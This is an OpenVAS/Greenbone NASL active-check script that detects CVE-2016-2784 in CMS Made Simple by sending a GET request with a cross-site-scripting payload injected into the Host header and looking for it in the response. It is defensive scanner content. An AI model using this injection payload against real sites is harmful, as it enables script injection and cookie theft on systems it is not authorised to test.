# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:cmsmadesimple:cms_made_simple";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.808061");
  script_version("2025-01-21T05:37:33+0000");
  script_tag(name:"last_modification", value:"2025-01-21 05:37:33 +0000 (Tue, 21 Jan 2025)");
  script_tag(name:"creation_date", value:"2016-06-07 16:34:53 +0530 (Tue, 07 Jun 2016)");
  script_tag(name:"cvss_base", value:"2.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:N/I:P/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2018-10-09 19:59:00 +0000 (Tue, 09 Oct 2018)");

  script_cve_id("CVE-2016-2784");

  script_tag(name:"qod_type", value:"remote_probe");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("CMS Made Simple Multiple Vulnerabilities (Jun 2016) - Active Check");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_cms_made_simple_http_detect.nasl");
  script_mandatory_keys("cmsmadesimple/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"CMS Made Simple is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether its
  able to read cookie value.");

  script_tag(name:"insight", value:"The following flaws exist:

  - Malicious content in a CMS Made Simple installation by poisoning the web server cache when
  Smarty Cache is activated by modifying the Host HTTP Header in his request.

  - Lack of filtering of HTML entities in $_SERVER variable.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to obtain
  sensitive information or conduct cross site scripting attacks.");

  script_tag(name:"affected", value:"CMS Made Simple version 1.x prior to 1.12.2 and 2.x prior
  to 2.1.3.");

  script_tag(name:"solution", value:"Update to version 1.12.2, 2.1.3 or later.");

  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/136897");
  script_xref(name:"URL", value:"http://www.cmsmadesimple.org/2016/04/Announcing-CMSMS-2-1-3-Black-Point");
  script_xref(name:"URL", value:"http://www.cmsmadesimple.org/2016/03/Announcing-CMSMS-1-12-2-kolonia");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!cmsPort = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:cmsPort))
  exit(0);

if(dir == "/")
  dir = "";

url = dir+ "/index.php";

cmsReq =  "GET " +url+ ' HTTP/1.1\r\n' +
          'Host: \' onload=\'javascrscript:ipt:alert(document.cookie)\r\n' +
          '\r\n';

cmsRes = http_keepalive_send_recv(port:cmsPort, data:cmsReq);

if(cmsRes =~ "HTTP/1\.. 200" && "alert(document.cookie)" >< cmsRes &&
      ">CMS Made Simple" >< cmsRes && "CMSMS Works" >< cmsRes)
{
  security_message(port:cmsPort);
  exit(0);
}

exit(0);
